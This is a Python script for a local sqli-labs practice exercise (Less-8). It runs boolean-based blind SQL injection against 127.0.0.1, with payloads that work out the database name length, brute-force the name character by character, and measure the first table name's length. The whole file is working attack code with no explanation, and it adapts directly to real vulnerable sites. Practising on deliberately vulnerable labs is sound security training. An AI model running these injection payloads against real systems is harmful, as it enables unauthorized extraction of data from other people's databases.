import requests
def database_len():
    for i in range(9999):
        url='''http://127.0.0.1/sqli/Less-8/'''
        payload='''?id=1' and length(database())>%s''' %i
        #print(url+payload+' --+ ')
        r=requests.get(url+payload+' --+ ')
        if 'You are in' in r.text:
            print(i)
        else:
            print('database_length:',i)
            break
#database_len()
def database_name():
    databasename=''
    for i in range(1,9):
        for j in '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz':
            url='''http://127.0.0.1/sqli/Less-8/'''
            payload='''?id=1' and substr(database(),%d,1) = '%s' ''' %(i,j)
            #print(url+payload+' --+ ')
            r=requests.get(url+payload+' --+ ')
            if 'You are in' in r.text:
                databasename += j
                print(databasename)
                break
    print("database_name:",databasename.lower())
#database_name()
def table_length():
        for j in range(9999):
            url='''http://127.0.0.1/sqli/Less-8/'''
            payload='''?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>%s''' %j
            r=requests.get(url+payload+' --+ ')
            if 'You are in' in r.text:
                print(j)
            else:
                print('firs table length:',j)
                break
table_length()